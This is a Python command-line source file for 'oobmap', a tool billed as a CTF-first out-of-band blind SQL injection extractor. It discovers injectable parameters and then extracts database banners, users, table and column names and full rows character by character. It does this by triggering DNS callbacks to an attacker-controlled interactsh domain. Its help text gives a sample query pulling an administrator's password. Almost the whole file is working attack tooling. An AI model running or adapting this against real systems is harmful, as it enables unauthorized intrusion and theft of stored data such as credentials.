import argparse
import copy
import string
import sys
import uuid

from . import __version__
from .dbms import DBMS
from .oob import InteractshLog
from .payloads import PROFILES
from .requester import current_value, inject, injection_points, parse_raw_request, send
from .session import SessionStore


DEFAULT_ALPHABET = string.ascii_lowercase + string.digits
ENUM_ALPHABET = string.ascii_letters + string.digits + " _-.:/@()[]{}+,;=<>|"


def normalize_domain(domain: str) -> str:
    domain = domain.strip()
    domain = domain.removeprefix("http://").removeprefix("https://")
    return domain.strip("/.")


def token_for(run_id: str, pos: int, char: str) -> str:
    return f"{run_id}-p{pos:02d}-c{ord(char):02x}"


def build_expression(args) -> str:
    if getattr(args, "expr", None):
        return args.expr

    column = getattr(args, "column", None)
    table = getattr(args, "table", None)
    where = getattr(args, "where", None)
    if not (column and table):
        raise SystemExit("dump requires -T/--table and -C/--column")

    if args.dbms == "mssql":
        expr = f"SELECT TOP 1 {column} FROM {table}"
    else:
        expr = f"SELECT {column} FROM {table}"

    if where:
        expr += f" WHERE {where}"
    if args.dbms != "mssql":
        expr += " LIMIT 1"
    return expr


def load_common(args):
    profile = PROFILES[args.dbms]
    request = parse_raw_request(args.request)
    domain = normalize_domain(args.domain)
    log = InteractshLog(args.log)
    run_id = args.run_id or uuid.uuid4().hex[:6]
    if args.base is None:
        args.base = current_value(request, args.param, args.place)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=args.flush_session)
    return profile, request, domain, log, run_id, session


def send_payload(args, request, payload):
    injected = inject(request, args.param, payload, args.place)
    try:
        status, body = send(injected, force_ssl=args.force_ssl, timeout=args.http_timeout)
        if args.verbose:
            print(f"[http] {status} {len(body)} bytes")
    except Exception as exc:
        if args.verbose:
            print(f"[http] ignored error: {exc}")


def run_check(args, profile, request, domain, log, run_id) -> int:
    print(f"[+] profile: {profile.name}")
    print(f"[+] {profile.comment}")
    print(f"[+] run id: {run_id}")
    print(f"[+] watching: {args.log}")
    print(f"[+] target: {args.place}:{args.param}")

    true_token = f"{run_id}-true"
    false_token = f"{run_id}-false"
    true_payload = profile.payload(args.base, args.true_condition, f"{true_token}.{domain}")
    false_payload = profile.payload(args.base, args.false_condition, f"{false_token}.{domain}")

    print("[+] sending true probe")
    send_payload(args, request, true_payload)
    true_hit = log.wait_any({true_token: "true"}, args.timeout)

    print("[+] sending false probe")
    send_payload(args, request, false_payload)
    false_hit = log.wait_any({false_token: "false"}, args.timeout)

    if true_hit and not false_hit:
        print("[+] OOB condition confirmed")
        return 0
    if true_hit and false_hit:
        print("[!] both true and false probes triggered callbacks")
        print("[!] payload is OOB-capable but not conditionally controlled")
        return 2
    print("[!] no reliable conditional OOB behavior detected")
    return 1


def check(args) -> int:
    if args.param:
        profile, request, domain, log, run_id, session = load_common(args)
        try:
            rc = run_check(args, profile, request, domain, log, run_id)
            status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
            session.save_check(session.check_id(args.dbms, args.place, args.param), args.dbms, args.place, args.param, status)
            print(f"[+] session: {session.path}")
            return rc
        finally:
            session.close()

    profile = PROFILES[args.dbms]
    request = parse_raw_request(args.request)
    domain = normalize_domain(args.domain)
    log = InteractshLog(args.log)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=args.flush_session)
    points = injection_points(request, args.level)
    if not points:
        print("[!] no injection points found at this level")
        session.close()
        return 1

    print(f"[+] scanning {len(points)} injection point(s) with level={args.level}, risk={args.risk}")
    found = False
    for point in points:
        candidate_args = copy.copy(args)
        candidate_args.param = point.name
        candidate_args.place = point.place
        candidate_args.base = point.value
        run_id = f"{args.run_id or uuid.uuid4().hex[:6]}-{point.place[:1]}{abs(hash((point.place, point.name))) % 10000}"
        print()
        rc = run_check(candidate_args, profile, request, domain, log, run_id)
        status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
        session.save_check(session.check_id(args.dbms, point.place, point.name), args.dbms, point.place, point.name, status)
        if rc == 0:
            print(f"[+] injectable OOB point: --place {point.place} -p {point.name}")
            found = True
            if args.first:
                break

    print(f"[+] session: {session.path}")
    session.close()
    return 0 if found else 1


def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
    profile, request, domain, log, run_id, session = load_common(args)
    extraction_id = session.extraction_id(args.dbms, args.place, args.param, expression, alphabet)
    cached = None if args.fresh_queries else session.get_extraction(extraction_id)
    result = ""
    start_pos = 1

    if cached and cached["completed"]:
        print(f"[+] resumed completed value from session: {cached['value']}")
        session.close()
        return cached["value"]

    if cached and cached["value"]:
        result = cached["value"]
        start_pos = len(result) + 1
        print(f"[+] resuming from session at position {start_pos}: {result}")

    print(f"[+] profile: {profile.name}")
    print(f"[+] {profile.comment}")
    print(f"[+] run id: {run_id}")
    print(f"[+] expression: {expression}")
    print(f"[+] domain: {domain}")
    print(f"[+] watching: {args.log}")
    print(f"[+] session: {session.path}")

    for pos in range(start_pos, max_len + 1):
        token_map: dict[str, str] = {}

        for char in alphabet:
            token = token_for(run_id, pos, char)
            token_map[token] = char
            condition = profile.condition(expression, pos, char)
            payload = profile.payload(args.base, condition, f"{token}.{domain}")
            send_payload(args, request, payload)

        token = log.wait_any(token_map, args.timeout)
        if not token:
            print(f"[+] done: {result}")
            session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, True)
            session.close()
            return result

        char = token_map[token]
        result += char
        session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
        print(f"[+] pos {pos:02d}: {char} -> {result}", flush=True)

    print(f"[!] reached max length: {result}")
    session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
    session.close()
    return result


def extract(args) -> int:
    require_param(args)
    expression = build_expression(args)
    extract_value(args, expression, args.alphabet, args.max_len)
    return 0


def dump(args) -> int:
    require_param(args)
    flush_session_once(args)
    dbms = DBMS[args.dbms]
    columns = [column.strip() for column in args.column.split(",") if column.strip()] if args.column else []
    columns = validate_dump_target(args, dbms, columns)

    print(f"[+] dumping table {args.table} columns: {', '.join(columns)}")
    if args.database:
        print(f"[+] database/schema: {args.database}")
    if args.where:
        print(f"[+] where: {args.where}")

    rows = []
    for index in range(args.limit):
        expr = dbms.dump_expression(args.table, columns, index, args.where, args.database)
        print(f"\n[+] row index {index}: {expr}")
        value = extract_value(args, expr, args.alphabet, args.max_len)
        if not value:
            print(f"[+] no more rows at index {index}")
            break
        row = split_dump_row(value, len(columns))
        rows.append(row)
        print_dump_row(columns, row)

    if rows:
        print("\n[+] dump result")
        print_dump_table(columns, rows)
    return 0


def split_dump_row(value: str, column_count: int) -> list[str]:
    parts = value.split("|")
    if len(parts) < column_count:
        parts.extend([""] * (column_count - len(parts)))
    if len(parts) > column_count:
        head = parts[: column_count - 1]
        tail = "|".join(parts[column_count - 1 :])
        parts = head + [tail]
    return parts


def print_dump_row(columns: list[str], row: list[str]):
    pairs = [f"{column}={value}" for column, value in zip(columns, row)]
    print("[+] " + ", ".join(pairs))


def print_dump_table(columns: list[str], rows: list[list[str]]):
    widths = [len(column) for column in columns]
    for row in rows:
        widths = [max(width, len(value)) for width, value in zip(widths, row)]
    header = " | ".join(column.ljust(width) for column, width in zip(columns, widths))
    sep = "-+-".join("-" * width for width in widths)
    print(header)
    print(sep)
    for row in rows:
        print(" | ".join(value.ljust(width) for value, width in zip(row, widths)))


def enum(args) -> int:
    require_param(args)
    flush_session_once(args)
    dbms = DBMS[args.dbms]
    selected = []
    for option, key in (
        (args.banner, "banner"),
        (args.current_user, "current_user"),
        (args.current_db, "current_db"),
    ):
        if option:
            selected.append(key)
    if args.tables:
        selected.append("tables")
    if args.columns:
        selected.append("columns")
    if not selected:
        raise SystemExit("enum requires at least one of --banner, --current-user, --current-db, --tables, --columns")

    for key in selected:
        if key == "tables":
            values = enumerate_rows(args, "table", lambda index: dbms.table_expression(index, args.database))
            save_catalog_values(args, "tables", values)
            continue
        if key == "columns":
            if not args.table:
                raise SystemExit("enum --columns requires -T/--table")
            values = enumerate_rows(
                args,
                f"column({args.table})",
                lambda index: dbms.column_expression(args.table, index, args.database),
            )
            save_catalog_values(args, "columns", values, args.table)
            continue

        expr = dbms.metadata_expression(key)
        if expr is None:
            print(f"[!] {key} is not implemented for {args.dbms}")
        else:
            print(f"\n[+] enum {key}: {expr}")
            value = extract_value(args, expr, args.alphabet, args.max_len)
            print(f"[+] {key}: {value}")
    return 0


def enumerate_rows(args, label: str, expression_builder) -> list[str]:
    values = []
    print(f"\n[+] enum {label}s")
    limit = getattr(args, "_catalog_limit", args.limit)
    for index in range(limit):
        try:
            expr = expression_builder(index)
        except ValueError as exc:
            print(f"[!] {exc}")
            return values

        print(f"[+] {label} index {index}: {expr}")
        value = extract_value(args, expr, args.alphabet, args.max_len)
        if not value:
            print(f"[+] no more {label}s at index {index}")
            break
        values.append(value)
        print(f"[+] {label}[{index}]: {value}")
    return values


def validate_dump_target(args, dbms, columns: list[str]) -> list[str]:
    if not args.validate:
        if not columns:
            raise SystemExit("dump without -C/--column requires validation/enumeration; keep --validate enabled or provide -C")
        return columns

    tables = get_or_enumerate_catalog(args, "tables", lambda index: dbms.table_expression(index, args.database))
    if args.table not in tables and args.table.upper() not in [table.upper() for table in tables]:
        raise SystemExit(
            f"table not confirmed in current session/catalog: {args.table}. "
            "Try --fresh-queries, adjust -D/--database, or run enum --tables."
        )

    known_columns = get_or_enumerate_catalog(
        args,
        "columns",
        lambda index: dbms.column_expression(args.table, index, args.database),
        args.table,
    )
    if not columns:
        if not known_columns:
            raise SystemExit(f"no columns discovered for table: {args.table}")
        print(f"[+] auto-selected columns from catalog: {', '.join(known_columns)}")
        return known_columns

    known_upper = {column.upper() for column in known_columns}
    missing = [column for column in columns if column.upper() not in known_upper]
    if missing:
        raise SystemExit(
            "column(s) not confirmed in current session/catalog: "
            + ", ".join(missing)
            + ". Try --fresh-queries or run enum --columns -T "
            + args.table
        )
    return columns


def get_or_enumerate_catalog(args, kind: str, expression_builder, table: str | None = None) -> list[str]:
    request = parse_raw_request(args.request)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=False)
    try:
        cached = None if args.fresh_queries else session.get_catalog(args.dbms, args.database, kind, table)
    finally:
        session.close()
    if cached is not None:
        print(f"[+] using cached {kind}: {', '.join(cached) if cached else '(empty)'}")
        return cached

    label = "table" if kind == "tables" else f"column({table})"
    catalog_args = copy.copy(args)
    catalog_args._catalog_limit = getattr(args, "enum_limit", args.limit)
    values = enumerate_rows(catalog_args, label, expression_builder)
    save_catalog_values(args, kind, values, table)
    return values


def save_catalog_values(args, kind: str, values: list[str], table: str | None = None):
    request = parse_raw_request(args.request)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=False)
    try:
        session.save_catalog(args.dbms, args.database, kind, values, table)
    finally:
        session.close()


def flush_session_once(args):
    if not args.flush_session:
        return
    request = parse_raw_request(args.request)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=True)
    session.close()
    args.flush_session = False


def require_param(args):
    if not args.param:
        raise SystemExit("this command requires -p/--param. Use `oobmap check` without -p to discover injectable OOB points.")


def add_common(parser):
    parser.add_argument("-r", "--request", required=True, help="raw HTTP request file")
    parser.add_argument("-p", "--param", help="parameter/cookie/header name to inject")
    parser.add_argument(
        "--place",
        choices=["auto", "cookie", "query", "body", "header", "marker"],
        default="auto",
        help="where to inject, or marker to replace the first '*'",
    )
    parser.add_argument(
        "--dbms",
        choices=sorted(PROFILES),
        required=True,
        help="OOB payload profile",
    )
    parser.add_argument("--domain", required=True, help="interactsh domain")
    parser.add_argument("--log", required=True, help="interactsh JSONL log path")
    parser.add_argument("--base", help="base/original value before the payload; defaults to the current target value")
    parser.add_argument("--force-ssl", action="store_true", help="send request over HTTPS")
    parser.add_argument("--http-timeout", type=float, default=10.0)
    parser.add_argument("--timeout", type=float, default=8.0, help="callback wait time per probe/position")
    parser.add_argument("--run-id", help="fixed run id for reproducible debugging")
    parser.add_argument("--level", type=int, choices=range(1, 6), default=1, help="scan depth for check without -p: 1=query/body, 2=cookies, 3=common headers, 5=all headers")
    parser.add_argument("--risk", type=int, choices=(1, 2, 3), default=1, help="accepted for sqlmap-like workflow; payload selection is profile-driven for now")
    parser.add_argument("--batch", action="store_true", help="accepted for sqlmap-like non-interactive workflows")
    parser.add_argument("--output-dir", help="session/output directory (default: ~/.local/share/oobmap/output)")
    parser.add_argument("--flush-session", action="store_true", help="delete the target session before running")
    parser.add_argument("--fresh-queries", action="store_true", help="ignore cached extraction results but keep the session")
    parser.add_argument("-D", "--database", help="database/schema/catalog to use for metadata and dump queries")
    parser.add_argument("-v", "--verbose", action="store_true")


def make_parser():
    parser = argparse.ArgumentParser(
        prog="oobmap",
        description="CTF-first OOB blind injection extractor powered by interactsh logs",
    )
    parser.add_argument("--version", action="version", version=f"oobmap {__version__}")
    sub = parser.add_subparsers(dest="command", required=True)

    p_check = sub.add_parser("check", help="confirm conditional OOB behavior")
    add_common(p_check)
    p_check.add_argument("--true-condition", default="1=1")
    p_check.add_argument("--false-condition", default="1=2")
    p_check.add_argument("--first", action="store_true", help="stop after the first confirmed OOB point")
    p_check.set_defaults(func=check)

    p_extract = sub.add_parser("extract", help="extract a scalar SQL expression")
    add_common(p_extract)
    p_extract.add_argument("--expr", required=True, help="scalar SQL expression, e.g. SELECT password FROM users WHERE username='administrator'")
    p_extract.add_argument("--alphabet", default=DEFAULT_ALPHABET)
    p_extract.add_argument("--max-len", type=int, default=40)
    p_extract.set_defaults(func=extract)

    p_dump = sub.add_parser("dump", help="convenience wrapper around extract")
    add_common(p_dump)
    p_dump.add_argument("-T", "--table", required=True)
    p_dump.add_argument("-C", "--column", help="comma-separated columns; if omitted, oobmap enumerates columns first")
    p_dump.add_argument("--where")
    p_dump.add_argument("--alphabet", default=DEFAULT_ALPHABET)
    p_dump.add_argument("--max-len", type=int, default=40)
    p_dump.add_argument("--limit", type=int, default=20, help="maximum rows to dump")
    p_dump.add_argument("--enum-limit", type=int, default=50, help="maximum tables/columns to enumerate during validation")
    p_dump.add_argument("--validate", dest="validate", action="store_true", default=True, help="confirm table/columns before dumping (default)")
    p_dump.add_argument("--no-validate", dest="validate", action="store_false", help="skip catalog validation; requires -C")
    p_dump.set_defaults(func=dump)

    p_enum = sub.add_parser("enum", help="extract common DBMS metadata over OOB")
    add_common(p_enum)
    p_enum.add_argument("--banner", action="store_true")
    p_enum.add_argument("--current-user", action="store_true")
    p_enum.add_argument("--current-db", action="store_true")
    p_enum.add_argument("--tables", action="store_true", help="enumerate table names")
    p_enum.add_argument("--columns", action="store_true", help="enumerate column names for -T/--table")
    p_enum.add_argument("-T", "--table", help="table name for --columns")
    p_enum.add_argument("--limit", type=int, default=20, help="maximum rows to enumerate for --tables/--columns")
    p_enum.add_argument("--alphabet", default=ENUM_ALPHABET)
    p_enum.add_argument("--max-len", type=int, default=120)
    p_enum.set_defaults(func=enum)

    p_profiles = sub.add_parser("profiles", help="list payload profiles")
    p_profiles.set_defaults(func=profiles)
    return parser


def profiles(args) -> int:
    for name in sorted(PROFILES):
        profile = PROFILES[name]
        print(f"{name:16} {profile.description}")
        print(f"{'':16} {profile.comment}")
    return 0


def main(argv=None):
    parser = make_parser()
    args = parser.parse_args(argv)
    try:
        return args.func(args)
    except KeyboardInterrupt:
        print("\n[!] interrupted", file=sys.stderr)
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
